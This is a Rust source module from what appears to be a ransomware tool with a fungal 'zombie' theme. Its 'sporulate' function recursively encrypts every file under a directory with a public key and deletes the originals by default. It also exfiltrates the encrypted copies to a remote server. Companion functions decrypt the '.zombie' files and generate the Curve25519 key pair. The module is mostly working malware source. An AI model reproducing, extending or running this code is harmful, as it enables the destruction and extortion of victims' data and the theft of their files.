//! A module for recursively walking a directory tree, processing
//! files (encrypt, decrypt, exfiltrate), and deleting original files.

use std::{
    collections::HashSet,
    fs::{self, File},
    io::{self, ErrorKind, Write},
    path::Path,
};

use log::{debug, error, info};
use reqwest::Client;
use walkdir::WalkDir;

use crate::{
    crypto::{
        EXTENSION, b64_decode, b64_encode, decrypt, encrypt, generate_keypair, load_private_key,
        load_public_key,
    },
    error::AppError,
    net::upload_file,
};

// Slices are used here for performance and to avoid specifying array size at
// compile time. This avoids heap allocation (Vec).
/// Permanent, read-only lists that contain permanent, read-only string
/// references
const EXCLUDED_DIRS: &[&str] = &[
    ".git",
    ".svn",
    "node_modules",
    "target",
    "__pycache__",
    ".idea",
    ".vscode",
    ".Spotlight-V100",
    ".Trashes",
    ".fseventsd",
];
const EXCLUDED_FILES: &[&str] = &[
    ".zombie",
    ".DS_Store",
    ".AppleDouble",
    ".LSOverride",
    ".VolumeIcon.icns",
    ".apdisk",
    ".metadata_never_index",
    ".dmg",
    ".pkg",
    ".tmp",
    ".bak",
    ".swp",
    ".swo",
];

/// Walks a directory tree starting from `path`, excluding directories
/// and files based on predefined lists, and encrypts and exfiltrates
/// files. It's like a spores burst--sporulate.
///
/// # Arguments
/// - `path`: The starting directory.
/// - `key`: Path to the main public key for encryption.
/// - `no_delete`: If true, the original file is not deleted after encryption.
/// - `server`: String representing the target server, like `http://server:2673`
///
/// # Logic
/// Uses `HashSet` for efficient lookups of excluded names.
/// Iterates through the file system, and for each valid file:
///   - Encrypts the file generating a `.zombie` version
///   - Sends the encrypted file to the target server
///   - Optionally, deletes the original file locally
///
/// # Returns
/// Returns a unit type if finished with success or an AppError if it fails.
#[tokio::main]
pub async fn sporulate(
    path: &Path,
    key: &Path,
    no_delete: &bool,
    server: &Option<String>,
) -> Result<(), AppError> {
    if !path.exists() {
        return Err(AppError::Io(io::Error::new(
            ErrorKind::NotFound,
            format!("Path not found: {:?}", path),
        )));
    }

    if !key.is_file() {
        return Err(AppError::Io(io::Error::new(
            ErrorKind::NotFound,
            format!("Key not found: {:?}", key),
        )));
    }

    let public_key = load_public_key(key)?;
    debug!("Loaded private key from {:?}", key);

    let excluded_dirs_set: HashSet<&str> = EXCLUDED_DIRS.iter().cloned().collect();
    let excluded_files_set: HashSet<&str> = EXCLUDED_FILES.iter().cloned().collect();

    let client = Client::new();

    // Create a lazy iterator that traverses the directory tree, filtering out
    // excluded entries and errors.
    let walker = WalkDir::new(path)
        .into_iter()
        .filter_entry(|entry| {
            let file_name = entry.file_name();
            let file_path = entry.path();

            if entry.file_type().is_dir()
                && let Some(file_name) = file_name.to_str()
                && excluded_dirs_set.contains(file_name)
            {
                debug!("Skipping folder {}", file_path.display());
                return false;
            }

            if entry.file_type().is_file() {
                let path = entry.path();
                let file_name_str = path.file_name().and_then(|name| name.to_str());
                let extension_str = path
                    .extension()
                    .and_then(|ext| ext.to_str())
                    .map(|ext| format!(".{}", ext));

                if file_name_str.is_some_and(|name| excluded_files_set.contains(name))
                    || extension_str.is_some_and(|ext| excluded_files_set.contains(ext.as_str()))
                {
                    debug!("Skipping file {}", file_path.display());
                    return false;
                }
            }
            true
        })
        .filter_map(Result::ok)
        .filter(|entry| entry.file_type().is_file());

    // Consuming the iterator triggers the file system scan.
    info!("Starting encryption process: path={:?}", path);
    for entry in walker {
        let file_path = entry.path();

        debug!("Encrypting file: {:?}", file_path);
        let zombie = match encrypt(file_path, &public_key) {
            Ok(z) => z,
            Err(e) => {
                error!("Failed to encrypt file {:?}: {}", file_path, e);
                continue;
            }
        };

        if !no_delete {
            debug!("Deleting original file: {:?}", file_path);
            if let Err(e) = fs::remove_file(file_path) {
                error!("Failed to delete file {:?}: {}", file_path, e);
                continue;
            }
        }

        if let Some(address) = server {
            debug!("Exfiltrating file: {:?}", zombie);
            if let Err(e) = upload_file(&client, address, &zombie).await {
                error!("Failed to exfiltrate file {:?}: {}", file_path, e);
                continue;
            }
        };
    }
    info!("Encryption process completed successfully");
    Ok(())
}

/// Traverses a directory tree starting from `path`, looking for `.zombie`
/// files to decrypt them. Disinfects a sporulated file.
///
/// # Arguments
/// - `path`: The starting directory.
/// - `key`: Path to the main private key for decryption.
/// - `no_delete`: If true, the `.zombie` file is not deleted after decryption.
///
/// # Logic
/// Iterates through the file system, finds `.zombie` files, and calls the
/// decryption routine for each one.
pub fn disinfect(path: &Path, key: &Path, no_delete: &bool) -> Result<(), AppError> {
    if !path.exists() {
        return Err(AppError::Io(io::Error::new(
            ErrorKind::NotFound,
            format!("Path not found: {:?}", path),
        )));
    }

    if !key.is_file() {
        return Err(AppError::Io(io::Error::new(
            ErrorKind::NotFound,
            format!("Key not found: {:?}", key),
        )));
    }

    let private_key = load_private_key(key)?;
    debug!("Loaded main private key from {:?}", key);

    // Create a lazy iterator that finds all `.zombie` files.
    let walker = WalkDir::new(path)
        .into_iter()
        .filter_map(Result::ok)
        .filter(|entry| {
            entry.file_type().is_file()
                && entry.path().extension().and_then(|ext| ext.to_str()) == Some(EXTENSION)
        });

    info!(
        "Starting decryption process: path={:?}, key={:?}",
        path, &key
    );
    for entry in walker {
        let file_path = entry.path();

        debug!("Decrypting file: {:?}", file_path);
        if let Err(e) = decrypt(file_path, &private_key) {
            error!("Failed to decrypt file {:?}: {}", file_path, e);
            continue;
        };

        if !no_delete {
            debug!("Deleting .zombie file: {:?}", file_path);
            if let Err(e) = fs::remove_file(file_path) {
                error!("Failed to delete file: {:?}: {}", file_path, e)
            }
        }
    }

    info!("Decryption process completed successfully");
    Ok(())
}

/// Generates a Curve25519 key pair and saves the Base64-encoded keys to the
/// specified path.
///
/// # Arguments
/// - `path`: The path to save the generated key pair named
///   `main-private.key` and `main-public.key`.
///
/// # Returns
/// A `Result` with a unit type on success of an AppError if the routine fails.
pub fn germinate(path: &Path) -> Result<(), AppError> {
    if !path.exists() || !path.is_dir() {
        return Err(AppError::Io(io::Error::new(
            io::ErrorKind::NotFound,
            format!("Path not found or not a directory: {:?}", path),
        )));
    }

    let (private_key_bytes, public_key_bytes) = generate_keypair()?;

    let private_key_b64 = b64_encode(&private_key_bytes);
    let private_key_path = path.join("main-private.key");

    let public_key_b64 = b64_encode(&public_key_bytes);
    let public_key_path = path.join("main-public.key");

    let mut file = File::create(&private_key_path)?;
    file.write_all(private_key_b64.as_ref())?;
    info!("Main private key saved to: {:?}", private_key_path);

    let mut file = File::create(&public_key_path)?;
    file.write_all(public_key_b64.as_ref())?;
    info!("Main public key saved to: {:?}", public_key_path);

    // Verify that the encoded keys can be decoded correctly
    if let Ok(prikey) = b64_decode(&private_key_b64) {
        assert_eq!(private_key_bytes, prikey);
    }
    if let Ok(pubkey) = b64_decode(&public_key_b64) {
        assert_eq!(public_key_bytes, pubkey);
    }

    Ok(())
}
